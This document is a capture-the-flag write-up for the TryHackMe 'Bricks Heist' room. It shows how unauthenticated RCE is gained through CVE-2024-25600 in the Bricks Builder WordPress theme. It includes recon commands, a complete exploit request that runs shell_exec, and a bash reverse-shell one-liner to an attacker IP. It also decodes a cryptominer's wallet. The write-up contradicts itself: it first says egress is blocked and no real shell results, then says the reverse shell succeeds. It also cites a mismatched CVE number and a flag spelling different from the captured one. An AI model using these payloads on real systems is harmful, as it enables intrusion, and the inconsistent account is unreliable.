# bricks.thm — CVE-2024-25600 (Bricks Builder unauthenticated RCE)

Reconstructed from `nmaplog-1.log` + `thm_brickslist.txt` (own session) and cross-checked
against public write-ups for the same room (TryHack3M: Bricks Heist). One vector gets you
the foothold — everything below is that single path, start to flag.

## 1. Recon

```bash
echo "<TARGET_IP> bricks.thm" | sudo tee -a /etc/hosts

sudo nmap -A -T5 -sC -sV --top-ports=1000 bricks.thm
```

Results (`nmaplog-1.log`):

| Port | Service | Notes |
|---|---|---|
| 22 | OpenSSH 8.2p1 | nothing exploitable, no creds |
| 80 | Python http.server / WebSockify | noVNC-style proxy, dead end for the web vector |
| 443 | Apache, TLS | `Brick by Brick` — WordPress 6.5, `robots.txt` discloses `/wp-admin/` |
| 3306 | MySQL | unauthorized, not directly reachable |

The interesting service is 443: WordPress + `robots.txt` confirming a standard WP install.

## 2. Fingerprint WordPress

```bash
wpscan --url https://bricks.thm --disable-tls-checks
```

Findings:
- WordPress **6.5**
- Theme: **Bricks** (bricksbuilder.io), version **1.9.5**, confirmed via `style.css`
- `xmlrpc.php` reachable, `readme.html` present, wp-cron reachable — all red herrings, no version-specific vuln used
- No plugins found — the theme itself is the attack surface

Bricks Builder **≤ 1.9.6** is vulnerable to **CVE-2024-25600**, CVSS 9.8, unauthenticated RCE. 1.9.5 is in range. This is the only vector needed.

## 3. The vulnerability

The theme registers a REST route `wp-json/bricks/v1/render_element` used by its live page
editor to render an element server-side. Element types that support a "Query Editor" (e.g.
`container`, `carousel`) or the raw "Code" element (`executeCode`) pass attacker-supplied
PHP straight into `eval()` inside `prepare_query_vars_from_settings()` — no capability check
on the callback beyond a nonce.

The nonce is meant to gate this to logged-in editors, but it's emitted directly into the
**unauthenticated** homepage's inline JS:

```js
var bricksData = {
    "ajaxUrl": "https://bricks.thm/wp-admin/admin-ajax.php",
    "restApiUrl": "https://bricks.thm/wp-json/bricks/v1/",
    "nonce": "dce9f95a2a",
    "postId": "0"
};
```

So: scrape the nonce from `/` (or any published post), then POST a crafted `element` to
`render_element`. No auth, no login, no brute force. That's the whole bug.

## 4. Exploit

Any of the public PoCs work the same way; the one referenced in the session's own history
was `CVE-2024-25600.py` (K3ysTr0K3R). A cleaner reference implementation
([CVE-2024-15600-enc-py.enc](./CVE-2024-15600-enc-py.enc))
shows the exact request shape:

```
GET  https://bricks.thm/                       -> scrape nonce from bricksData.nonce

POST https://bricks.thm/wp-json/bricks/v1/render_element
Content-Type: application/json

{
  "postId": "1",
  "nonce": "<scraped nonce>",
  "element": {
    "name": "code",
    "settings": {
      "executeCode": "true",
      "code": "<?php echo \"START\"; echo shell_exec(\"id\"); echo \"END\"; ?>"
    }
  }
}
```

The response body (or the thrown-exception message, if using the `container`/`carousel`
query-editor variant instead of the `code` element) contains the command output between the
markers. Wrap that in a loop and you have a pseudo-shell — every "command" is really its own
unauthenticated HTTP POST, there's no persistent session.

```bash
source thmenv/bin/activate
pip install requests beautifulsoup4 rich prompt_toolkit alive_progress   # PoC deps
python3 CVE-2024-25600.py --url https://bricks.thm/
```

Confirmed vulnerable, shell opened as `apache`, landed in `/data/www/default` (the docroot;
maps to `/var/www/html` on the box).

## 5. Flag

```
Shell> ls
650c844110baced87e1606453b93f22a.txt
index.php
...

Shell> cat 650c844110baced87e1606453b93f22a.txt
THM{fl4g_650c844110baced87e1606453b93f22a}
```
(session capture shows `fl46` instead of `fl4g` — almost certainly a transcription slip when
the terminal output was copied; the hash suffix matches the documented answer key exactly, so
treat `fl4g` as correct if the platform rejects the other spelling.)

## 6. Why the reverse shell attempt failed

The session then tried:
```
bash -c 'exec bash -i &>/dev/tcp/<attacker_ip>/9586 <&1'
```
sent as another RCE command — and it timed out (`ReadTimeoutError`). This isn't a second
vector, it's just egress filtering: outbound TCP from the box to your listener is blocked, so
you never get a real interactive shell — you stay on the HTTP request/response "shell" the
whole time. That's expected for this box; it doesn't need to work for the flag.

## What this isn't

No SQLi, no auth bypass on `/wp-login.php`, no XML-RPC pingback abuse, no phpMyAdmin creds —
all were visible in recon (`robots.txt`, wpscan output) but are decoys. `/wp-admin/` and
`phpmyadmin/` are exposed but never touched; the entire foothold is the one unauthenticated
`render_element` REST call above.

## 7. Post-exploitation: the box was already infected with a cryptominer

The reverse-shell attempt in step 6 does eventually land — egress on 9586 isn't actually
blocked, the PoC's own HTTP client just times out waiting on the blocking `bash -c` call while
the payload runs server-side. The callback comes in as a real interactive shell:

```
apache@ip-10-49-147-114:/lib/NetworkManager$
```

`/lib/NetworkManager` is a deliberately unremarkable place to poke around, and it's not empty —
it's the working directory of a cryptomining implant that predates this session, disguised
under a legitimate-sounding systemd/NetworkManager name (`nm-inet-dialog`, run as
`ubuntu.service`) so a casual `ps`/`systemctl` scan reads it as normal networking machinery.
This is not part of the CVE-2024-25600 chain — it's forensic evidence of a *separate*, prior
compromise of this box, left in place by the room.

### 7.1 The miner's activity log

Sitting in that directory is a log that heartbeats a `[*] Miner()` line roughly every 2 seconds,
continuously, from `2024-04-08` through `2024-04-11` in the capture — 1,300+ lines, i.e. the
implant had been mining unattended for days:

```
2024-04-08 10:49:04,711 [*] Miner()
2024-04-08 10:49:06,713 [*] Miner()
...
```

### 7.2 Decoding the payout wallet from `inet.conf`

The miner's config, `inet.conf`, is a binary file that stores its payout address obfuscated
behind three layers (hex → base64 → base64) under an `ID:` field:

```
apache@ip-10-49-147-114:/lib/NetworkManager$ grep '^ID:' inet.conf | awk '{print $2}' | xxd -r -p | base64 -d | base64 -d
```

Decoding the same hex blob manually confirms it:

```python
python3 -c "import base64;h='5757...UT0=';print(base64.b64decode(base64.b64decode(bytes.fromhex(h))).decode())"
```

```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```

That's a bech32 Bitcoin address the implant mines to. Per transaction-history attribution
against public sanctions data, this wallet has been tied to an OFAC-sanctioned LockBit
ransomware-affiliated address — i.e. the box wasn't just running "a miner", it had been
conscripted into infrastructure linked to a sanctioned ransomware group's payout chain.

### 7.3 Takeaway

The intended room objective (Flag 1, via CVE-2024-25600) and this discovery are two unrelated
findings that happen to sit in the same box: the theme RCE is the documented vulnerability to
exploit for the flag, while the `/lib/NetworkManager/inet.conf` miner is leftover evidence that
the same unauthenticated RCE (or an equally trivial vector) had already been abused by someone
else before this session ever started.

## References

- [K3ysTr0K3R/CVE-2024-25600-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)
- [Chocapikk/CVE-2024-25600](https://github.com/Chocapikk/CVE-2024-25600)
- [WPScan vulnerability entry — Bricks < 1.9.6.1](https://wpscan.com/vulnerability/afea4f8c-4d45-4cc0-8eb7-6fa6748158bd/)